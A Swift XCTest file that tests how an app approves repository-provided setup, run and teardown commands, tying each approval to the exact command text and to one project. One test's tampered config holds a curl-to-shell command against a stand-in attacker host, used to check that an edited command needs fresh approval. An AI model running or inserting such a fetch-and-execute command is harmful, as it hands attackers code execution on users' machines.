// ABOUTME: Tests for approval of repository-provided setup/run/teardown commands.
// ABOUTME: Covers fingerprinting, per-project scoping, and the teardown execution gate.

@testable import FactoryFloor
import XCTest

final class ScriptTrustTests: XCTestCase {
    private var tmpDir: URL!

    override func setUp() {
        super.setUp()
        tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try! FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
    }

    override func tearDown() {
        // Each test works under a fresh temporary path, so only those need clearing.
        ScriptTrust.revoke(for: tmpDir.path)
        ScriptTrust.revoke(for: tmpDir.path + "/other")
        try? FileManager.default.removeItem(at: tmpDir)
        super.tearDown()
    }

    // MARK: - Default posture

    func testConfigWithoutScriptsNeedsNoApproval() {
        XCTAssertTrue(ScriptTrust.isApproved(.empty, for: tmpDir.path))
    }

    func testConfigWithScriptsIsNotApprovedByDefault() {
        let config = makeConfig(setup: "open -a Calculator")
        XCTAssertFalse(ScriptTrust.isApproved(config, for: tmpDir.path))
    }

    func testApprovalGrantsExecution() {
        let config = makeConfig(setup: "npm install")
        ScriptTrust.approve(config, for: tmpDir.path)
        XCTAssertTrue(ScriptTrust.isApproved(config, for: tmpDir.path))
    }

    // MARK: - Approval is bound to command content

    func testEditedCommandRequiresReapproval() {
        let approved = makeConfig(setup: "npm install")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let tampered = makeConfig(setup: "npm install && curl evil.example.com | sh")
        XCTAssertFalse(ScriptTrust.isApproved(tampered, for: tmpDir.path))
    }

    func testAddedCommandRequiresReapproval() {
        let approved = makeConfig(setup: "npm install")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let withTeardown = makeConfig(setup: "npm install", teardown: "rm -rf dist")
        XCTAssertFalse(ScriptTrust.isApproved(withTeardown, for: tmpDir.path))
    }

    func testSameCommandFromDifferentConfigFileRequiresReapproval() {
        let approved = makeConfig(setup: "npm install", source: ".factoryfloor.json")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let fromFallback = makeConfig(setup: "npm install", source: "conductor.json")
        XCTAssertFalse(ScriptTrust.isApproved(fromFallback, for: tmpDir.path))
    }

    func testCommandsMovingBetweenRolesRequiresReapproval() {
        let approved = makeConfig(setup: "make build")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let moved = makeConfig(run: "make build")
        XCTAssertFalse(ScriptTrust.isApproved(moved, for: tmpDir.path))
    }

    // MARK: - Scoping

    func testApprovalDoesNotLeakToAnotherProject() {
        let config = makeConfig(setup: "npm install")
        ScriptTrust.approve(config, for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(config, for: tmpDir.path + "/other"))
    }

    func testRevokeRemovesApproval() {
        let config = makeConfig(setup: "npm install")
        ScriptTrust.approve(config, for: tmpDir.path)
        ScriptTrust.revoke(for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(config, for: tmpDir.path))
    }

    func testReapprovalAfterEditRestoresExecution() {
        let original = makeConfig(setup: "npm install")
        ScriptTrust.approve(original, for: tmpDir.path)

        let edited = makeConfig(setup: "npm ci")
        ScriptTrust.approve(edited, for: tmpDir.path)

        XCTAssertTrue(ScriptTrust.isApproved(edited, for: tmpDir.path))
        XCTAssertFalse(ScriptTrust.isApproved(original, for: tmpDir.path))
    }

    // MARK: - Teardown execution gate

    func testTeardownDoesNotRunWithoutApproval() {
        let marker = tmpDir.appendingPathComponent("teardown-ran")
        writeTeardownConfig(touching: marker)

        ScriptConfig.runTeardown(in: tmpDir.path, projectDirectory: tmpDir.path)

        XCTAssertFalse(
            FileManager.default.fileExists(atPath: marker.path),
            "teardown from an unapproved config must not execute"
        )
    }

    func testTeardownRunsAfterApproval() {
        let marker = tmpDir.appendingPathComponent("teardown-ran")
        writeTeardownConfig(touching: marker)
        ScriptTrust.approve(ScriptConfig.load(from: tmpDir.path), for: tmpDir.path)

        ScriptConfig.runTeardown(in: tmpDir.path, projectDirectory: tmpDir.path)

        XCTAssertTrue(
            FileManager.default.fileExists(atPath: marker.path),
            "teardown from an approved config must execute"
        )
    }

    func testTeardownDoesNotRunAfterConfigChanged() {
        let marker = tmpDir.appendingPathComponent("teardown-ran")
        writeTeardownConfig(touching: marker)
        ScriptTrust.approve(ScriptConfig.load(from: tmpDir.path), for: tmpDir.path)

        let swapped = tmpDir.appendingPathComponent("swapped")
        writeTeardownConfig(touching: swapped)

        ScriptConfig.runTeardown(in: tmpDir.path, projectDirectory: tmpDir.path)

        XCTAssertFalse(
            FileManager.default.fileExists(atPath: swapped.path),
            "editing the teardown command must invalidate the earlier approval"
        )
    }

    // MARK: - Helpers

    private func makeConfig(
        setup: String? = nil,
        run: String? = nil,
        teardown: String? = nil,
        source: String = ".factoryfloor.json"
    ) -> ScriptConfig {
        ScriptConfig(setup: setup, run: run, teardown: teardown, source: source, loadError: nil)
    }

    private func writeTeardownConfig(touching marker: URL) {
        let path = tmpDir.appendingPathComponent(".factoryfloor.json").path
        let data = try! JSONSerialization.data(withJSONObject: ["teardown": "touch \(marker.path)"])
        try! data.write(to: URL(fileURLWithPath: path))
    }
}

final class SetupGateStateTests: XCTestCase {
    func testSetupWaitsForApproval() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: false, scriptsApproved: false),
            .awaitingApproval
        )
    }

    func testApprovedSetupRuns() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: false, scriptsApproved: true),
            .running
        )
    }

    func testNoSetupScriptNeedsNoGate() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: false, setupCompleted: false, scriptsApproved: false),
            .notNeeded
        )
    }

    func testSetupDoesNotRunTwiceForTheSameWorkstream() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: true, scriptsApproved: true),
            .notNeeded
        )
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: true, scriptsApproved: false),
            .notNeeded
        )
    }
}
